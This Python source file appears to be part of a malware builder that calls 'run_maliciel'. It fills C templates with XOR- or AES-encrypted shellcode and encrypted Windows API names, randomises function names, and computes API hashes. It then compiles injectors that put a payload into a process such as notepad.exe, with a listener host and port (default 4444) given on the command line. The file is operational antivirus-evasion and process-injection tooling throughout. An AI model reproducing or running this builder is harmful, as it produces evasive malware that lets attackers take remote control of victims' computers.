def peDataReplaceAES(mode, f_xor, f_aes, ciphertext, p_key, ciphertext_cth, ct_key, ciphertext_wfso, wfso_key, data, f_inj, f_ftt, ciphertext_vaex, vaex_key, ciphertext_wpm, wpm_key, ciphertext_clh, clh_key, ciphertext_p32f, p32f_key, ciphertext_p32n, p32n_key, ciphertext_op, op_key, ciphertext_ct32s, ct32s_key, ciphertext_proc, proc_key, ciphertext_k32, k32_key):
    data = data.replace('unsigned char my_payload[] = { };', 'unsigned char my_payload[] = ' + ciphertext)
    data = data.replace('unsigned char s_vaex[] = { };', 'unsigned char s_vaex[] = ' + ciphertext_vaex)
    data = data.replace('unsigned char s_cth[] = { };', 'unsigned char s_cth[] = ' + ciphertext_cth)
    data = data.replace('unsigned char s_wfso[] = { };', 'unsigned char s_wfso[] = ' + ciphertext_wfso)
    data = data.replace('unsigned char s_wpm[] = { };', 'unsigned char s_wpm[] = ' + ciphertext_wpm)
    data = data.replace('unsigned char s_op[] = { };', 'unsigned char s_op[] = ' + ciphertext_op)
    data = data.replace('unsigned char s_clh[] = { };', 'unsigned char s_clh[] = ' + ciphertext_clh)
    data = data.replace('unsigned char s_p32f[] = { };', 'unsigned char s_p32f[] = ' + ciphertext_p32f)
    data = data.replace('unsigned char s_p32n[] = { };', 'unsigned char s_p32n[] = ' + ciphertext_p32n)
    data = data.replace('unsigned char s_ct32s[] = { };', 'unsigned char s_ct32s[] = ' + ciphertext_ct32s)
    data = data.replace('unsigned char my_proc[] = { };', 'unsigned char my_proc[] = ' + ciphertext_proc)
    data = data.replace('unsigned char s_k32[] = { };', 'unsigned char s_k32[] = ' + ciphertext_k32)

    data = data.replace('char my_payload_key[] = "";', 'char my_payload_key[] = "' + p_key + '";')
    data = data.replace('char my_proc_key[] = "";', 'char my_proc_key[] = "' + proc_key + '";')
    data = data.replace('char s_vaex_key[] = "";', 'char s_vaex_key[] = "' + vaex_key + '";')
    data = data.replace('char s_wpm_key[] = "";', 'char s_wpm_key[] = "' + wpm_key + '";')
    data = data.replace('char s_cth_key[] = "";', 'char s_cth_key[] = "' + ct_key + '";')
    data = data.replace('char s_wfso_key[] = "";', 'char s_wfso_key[] = "' + wfso_key + '";')
    data = data.replace('char s_clh_key[] = "";', 'char s_clh_key[] = ' + clh_key)
    data = data.replace('char s_p32f_key[] = "";', 'char s_p32f_key[] = "' + p32f_key + '";')
    data = data.replace('char s_p32n_key[] = "";', 'char s_p32n_key[] = "' + p32n_key + '";')
    data = data.replace('char s_op_key[] = "";', 'char s_op_key[] = ' + op_key)
    data = data.replace('char s_ct32s_key[] = "";', 'char s_ct32s_key[] = "' + ct32s_key + '";')
    data = data.replace('char k32_key[] = "";', 'char k32_key[] = "' + k32_key + '";')
    data = data.replace('XOR(', f_xor + "(")
    data = data.replace('AESDecrypt(', f_aes + "(")
    data = data.replace("Inject(", f_inj + "(")
    data = data.replace("FindTarget(", f_ftt + "(")

    if mode == "console":
        data = data.replace("int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {", "int main(void) {")
    return data

def peEncryptAES(proc_name, encryptor, plaintext, f_cth, f_wfso, f_vaex, f_op, f_wpm, f_clh, f_p32f, f_p32n, f_ct32s, k32_name):
    f_xor, f_inj, f_ftt, f_aes = encryptor.random(), encryptor.random(), encryptor.random(), encryptor.random()
    ciphertext, p_key = encryptor.xor_encrypt(plaintext, encryptor.payload_key())
    ciphertext_vaex, vaex_key = encryptor.xor_encrypt(f_vaex, encryptor.func_key())
    ciphertext_wpm, wpm_key = encryptor.xor_encrypt(f_wpm, encryptor.func_key())
    ciphertext_cth, ct_key = encryptor.xor_encrypt(f_cth, encryptor.func_key())
    ciphertext_wfso, wfso_key = encryptor.xor_encrypt(f_wfso, encryptor.func_key())
    ciphertext_clh, clh_key = encryptor.aes_encrypt(f_clh, encryptor.aes_key())
    ciphertext_p32f, p32f_key = encryptor.xor_encrypt(f_p32f, encryptor.func_key())
    ciphertext_p32n, p32n_key = encryptor.xor_encrypt(f_p32n, encryptor.func_key())
    ciphertext_op, op_key = encryptor.aes_encrypt(f_op, encryptor.aes_key())
    ciphertext_ct32s, ct32s_key = encryptor.xor_encrypt(f_ct32s, encryptor.func_key())
    ciphertext_proc, proc_key = encryptor.xor_encrypt(proc_name, encryptor.proc_key())
    ciphertext_k32, k32_key = encryptor.xor_encrypt(k32_name, encryptor.dll_key())
    return f_xor,f_aes,ciphertext,p_key,ciphertext_cth,ct_key,ciphertext_wfso,wfso_key,f_inj,f_ftt,ciphertext_vaex,vaex_key,ciphertext_wpm,wpm_key,ciphertext_clh,clh_key,ciphertext_p32f,p32f_key,ciphertext_p32n,p32n_key,ciphertext_op,op_key,ciphertext_ct32s,ct32s_key,ciphertext_proc,proc_key,ciphertext_k32,k32_key

def peDataReplaceXOR(mode, f_xor, ciphertext, p_key, ciphertext_cth, ct_key, ciphertext_wfso, wfso_key, data, f_inj, f_ftm, ciphertext_vaex, vaex_key, ciphertext_wpm, wpm_key, ciphertext_clh, clh_key, ciphertext_p32f, p32f_key, ciphertext_p32n, p32n_key, ciphertext_op, op_key, ciphertext_ct32s, ct32s_key, ciphertext_proc, proc_key, ciphertext_k32, k32_key, kernel32_hash, getmodulehandle_hash, getprocaddress_hash):
    data = data.replace('unsigned char my_payload[] = { };', 'unsigned char my_payload[] = ' + ciphertext)
    data = data.replace('unsigned char s_vaex[] = { };', 'unsigned char s_vaex[] = ' + ciphertext_vaex)
    data = data.replace('unsigned char s_cth[] = { };', 'unsigned char s_cth[] = ' + ciphertext_cth)
    data = data.replace('unsigned char s_wfso[] = { };', 'unsigned char s_wfso[] = ' + ciphertext_wfso)
    data = data.replace('unsigned char s_wpm[] = { };', 'unsigned char s_wpm[] = ' + ciphertext_wpm)
    data = data.replace('unsigned char s_op[] = { };', 'unsigned char s_op[] = ' + ciphertext_op)
    data = data.replace('unsigned char s_clh[] = { };', 'unsigned char s_clh[] = ' + ciphertext_clh)
    data = data.replace('unsigned char s_p32f[] = { };', 'unsigned char s_p32f[] = ' + ciphertext_p32f)
    data = data.replace('unsigned char s_p32n[] = { };', 'unsigned char s_p32n[] = ' + ciphertext_p32n)
    data = data.replace('unsigned char s_ct32s[] = { };', 'unsigned char s_ct32s[] = ' + ciphertext_ct32s)
    data = data.replace('unsigned char my_proc[] = { };', 'unsigned char my_proc[] = ' + ciphertext_proc)
    data = data.replace('unsigned char s_k32[] = { };', 'unsigned char s_k32[] = ' + ciphertext_k32)

    data = data.replace('char my_payload_key[] = "";', 'char my_payload_key[] = "' + p_key + '";')
    data = data.replace('char my_proc_key[] = "";', 'char my_proc_key[] = "' + proc_key + '";')
    data = data.replace('char s_vaex_key[] = "";', 'char s_vaex_key[] = "' + vaex_key + '";')
    data = data.replace('char s_wpm_key[] = "";', 'char s_wpm_key[] = "' + wpm_key + '";')
    data = data.replace('char s_cth_key[] = "";', 'char s_cth_key[] = "' + ct_key + '";')
    data = data.replace('char s_wfso_key[] = "";', 'char s_wfso_key[] = "' + wfso_key + '";')
    data = data.replace('char s_clh_key[] = "";', 'char s_clh_key[] = "' + clh_key + '";')
    data = data.replace('char s_p32f_key[] = "";', 'char s_p32f_key[] = "' + p32f_key + '";')
    data = data.replace('char s_p32n_key[] = "";', 'char s_p32n_key[] = "' + p32n_key + '";')
    data = data.replace('char s_op_key[] = "";', 'char s_op_key[] = "' + op_key + '";')
    data = data.replace('char s_ct32s_key[] = "";', 'char s_ct32s_key[] = "' + ct32s_key + '";')
    data = data.replace('char k32_key[] = "";', 'char k32_key[] = "' + k32_key + '";')
    data = data.replace('XOR(', f_xor + "(")
    data = data.replace("Inject(", f_inj + "(")
    data = data.replace("findMyProc(", f_ftm + "(")

    print (Colors.BLUE + "calculating win API hashes..." + Colors.ENDC)
    data = data.replace('#define KERNEL32_HASH 0x00000000', '#define KERNEL32_HASH ' + str(kernel32_hash))
    data = data.replace('#define GETMODULEHANDLE_HASH 0x00000000', '#define GETMODULEHANDLE_HASH ' + str(getmodulehandle_hash))
    data = data.replace('#define GETPROCADDRESS_HASH 0x00000000', '#define GETPROCADDRESS_HASH ' + str(getprocaddress_hash))

    if mode == "console":
        data = data.replace("int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {", "int main(void) {")
    return data

def peEncryptXOR(proc_name, encryptor, plaintext, f_cth, f_wfso, f_vaex, f_op, f_wpm, f_clh, f_p32f, f_p32n, f_ct32s, k32_name):
    f_xor, f_inj, f_ftm = encryptor.random(), encryptor.random(), encryptor.random()
    ciphertext, p_key = encryptor.xor_encrypt(plaintext, encryptor.payload_key())
    ciphertext_vaex, vaex_key = encryptor.xor_encrypt(f_vaex, encryptor.func_key())
    ciphertext_wpm, wpm_key = encryptor.xor_encrypt(f_wpm, encryptor.func_key())
    ciphertext_cth, ct_key = encryptor.xor_encrypt(f_cth, encryptor.func_key())
    ciphertext_wfso, wfso_key = encryptor.xor_encrypt(f_wfso, encryptor.func_key())
    ciphertext_clh, clh_key = encryptor.xor_encrypt(f_clh, encryptor.func_key())
    ciphertext_p32f, p32f_key = encryptor.xor_encrypt(f_p32f, encryptor.func_key())
    ciphertext_p32n, p32n_key = encryptor.xor_encrypt(f_p32n, encryptor.func_key())
    ciphertext_op, op_key = encryptor.xor_encrypt(f_op, encryptor.func_key())
    ciphertext_ct32s, ct32s_key = encryptor.xor_encrypt(f_ct32s, encryptor.func_key())
    ciphertext_proc, proc_key = encryptor.xor_encrypt(proc_name, encryptor.proc_key())
    ciphertext_k32, k32_key = encryptor.xor_encrypt(k32_name, encryptor.dll_key())
    return f_xor,ciphertext,p_key,ciphertext_cth,ct_key,ciphertext_wfso,wfso_key,f_inj,f_ftm,ciphertext_vaex,vaex_key,ciphertext_wpm,wpm_key,ciphertext_clh,clh_key,ciphertext_p32f,p32f_key,ciphertext_p32n,p32n_key,ciphertext_op,op_key,ciphertext_ct32s,ct32s_key,ciphertext_proc,proc_key,ciphertext_k32,k32_key

def dllDataReplaceAES(f_rce, f_xor, f_aes, ciphertext, p_key, ciphertext_va, va_key, ciphertext_vp, vp_key, ciphertext_cth, ct_key, ciphertext_wfso, wfso_key, ciphertext_rmm, rmm_key, data):
    data = data.replace('unsigned char my_payload[] = { };', 'unsigned char my_payload[] = ' + ciphertext)
    data = data.replace('unsigned char s_va[] = { };', 'unsigned char s_va[] = ' + ciphertext_va)
    data = data.replace('unsigned char s_vp[] = { };', 'unsigned char s_vp[] = ' + ciphertext_vp)
    data = data.replace('unsigned char s_ct[] = { };', 'unsigned char s_ct[] = ' + ciphertext_cth)
    data = data.replace('unsigned char s_wfso[] = { };', 'unsigned char s_wfso[] = ' + ciphertext_wfso)
    data = data.replace('unsigned char s_rmm[] = { };', 'unsigned char s_rmm[] = ' + ciphertext_rmm)

    data = data.replace('char my_payload_key[] = "";', 'char my_payload_key[] = "' + p_key + '";')

    data = data.replace('char s_va_key[] = "";', 'char s_va_key[] = ' + va_key)
    data = data.replace('char s_vp_key[] = "";', 'char s_vp_key[] = ' + vp_key)
    data = data.replace('char s_ct_key[] = "";', 'char s_ct_key[] = ' + ct_key)
    data = data.replace('char s_wfso_key[] = "";', 'char s_wfso_key[] = ' + wfso_key)
    data = data.replace('char s_rmm_key[] = "";', 'char s_rmm_key[] = ' + rmm_key)

    data = data.replace('RunRCE(', f_rce + '(')
    data = data.replace('XOR(', f_xor + '(')
    data = data.replace('AESDecrypt(', f_aes + '(')
    return data

def dllEncryptAES(encryptor, plaintext, f_va, f_vp, f_cth, f_wfso, f_rmm):
    f_rce, f_xor, f_aes = encryptor.random(), encryptor.random(), encryptor.random()
    ciphertext, p_key = encryptor.xor_encrypt(plaintext, encryptor.payload_key())
    ciphertext_va, va_key = encryptor.aes_encrypt(f_va, encryptor.aes_key())
    ciphertext_vp, vp_key = encryptor.aes_encrypt(f_vp, encryptor.aes_key())
    ciphertext_cth, ct_key = encryptor.aes_encrypt(f_cth, encryptor.aes_key())
    ciphertext_wfso, wfso_key = encryptor.aes_encrypt(f_wfso, encryptor.aes_key())
    ciphertext_rmm, rmm_key = encryptor.aes_encrypt(f_rmm, encryptor.aes_key())
    return f_rce,f_xor,ciphertext,p_key,ciphertext_va,va_key,ciphertext_vp,vp_key,ciphertext_cth,ct_key,ciphertext_wfso,wfso_key,ciphertext_rmm,rmm_key

def dllDataReplaceXOR(f_rce, f_xor, ciphertext, p_key, ciphertext_va, va_key, ciphertext_vp, vp_key, ciphertext_cth, ct_key, ciphertext_wfso, wfso_key, ciphertext_rmm, rmm_key, data):
    data = data.replace('unsigned char my_payload[] = { };', 'unsigned char my_payload[] = ' + ciphertext)
    data = data.replace('unsigned char s_va[] = { };', 'unsigned char s_va[] = ' + ciphertext_va)
    data = data.replace('unsigned char s_vp[] = { };', 'unsigned char s_vp[] = ' + ciphertext_vp)
    data = data.replace('unsigned char s_ct[] = { };', 'unsigned char s_ct[] = ' + ciphertext_cth)
    data = data.replace('unsigned char s_wfso[] = { };', 'unsigned char s_wfso[] = ' + ciphertext_wfso)
    data = data.replace('unsigned char s_rmm[] = { };', 'unsigned char s_rmm[] = ' + ciphertext_rmm)

    data = data.replace('char my_payload_key[] = "";', 'char my_payload_key[] = "' + p_key + '";')

    data = data.replace('char s_va_key[] = "";', 'char s_va_key[] = "' + va_key + '";')
    data = data.replace('char s_vp_key[] = "";', 'char s_vp_key[] = "' + vp_key + '";')
    data = data.replace('char s_ct_key[] = "";', 'char s_ct_key[] = "' + ct_key + '";')
    data = data.replace('char s_wfso_key[] = "";', 'char s_wfso_key[] = "' + wfso_key + '";')
    data = data.replace('char s_rmm_key[] = "";', 'char s_rmm_key[] = "' + rmm_key + '";')

    data = data.replace('RunRCE(', f_rce + '(')
    data = data.replace('XOR(', f_xor + '(')
    return data

def dllEncryptXOR(encryptor, plaintext, f_va, f_vp, f_cth, f_wfso, f_rmm):
    f_rce, f_xor = encryptor.random(), encryptor.random()
    ciphertext, p_key = encryptor.xor_encrypt(plaintext, encryptor.payload_key())
    ciphertext_va, va_key = encryptor.xor_encrypt(f_va, encryptor.func_key())
    ciphertext_vp, vp_key = encryptor.xor_encrypt(f_vp, encryptor.func_key())
    ciphertext_cth, ct_key = encryptor.xor_encrypt(f_cth, encryptor.func_key())
    ciphertext_wfso, wfso_key = encryptor.xor_encrypt(f_wfso, encryptor.func_key())
    ciphertext_rmm, rmm_key = encryptor.xor_encrypt(f_rmm, encryptor.func_key())
    return f_rce,f_xor,ciphertext,p_key,ciphertext_va,va_key,ciphertext_vp,vp_key,ciphertext_cth,ct_key,ciphertext_wfso,wfso_key,ciphertext_rmm,rmm_key

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument('-l','--lhost', required = True, help = "local IP")
    parser.add_argument('-p','--lport', required = True, help = "local port", default = '4444')
    parser.add_argument('-b', '--build', required = True, help = "DLL injection (\"1\"), Process injection (\"2\") or NT injection (\"3\")", default = '1')
    parser.add_argument('-c', '--encryption', required = True, help = "XOR encryption (\"1\") or AES (\"2\")", default = '1')
    parser.add_argument('-e', '--proc', required = False, help = "process name", default = "notepad.exe")
    parser.add_argument("-m", '--mode', required = False, help = "console or windows app", default = "windows")
    args = vars(parser.parse_args())
    host, port = args['lhost'], args['lport']
    build, encryption = args['build'], args['encryption']
    proc_name, mode = args['proc'], args['mode']
    run_maliciel(host, port, build, encryption, proc_name, mode)
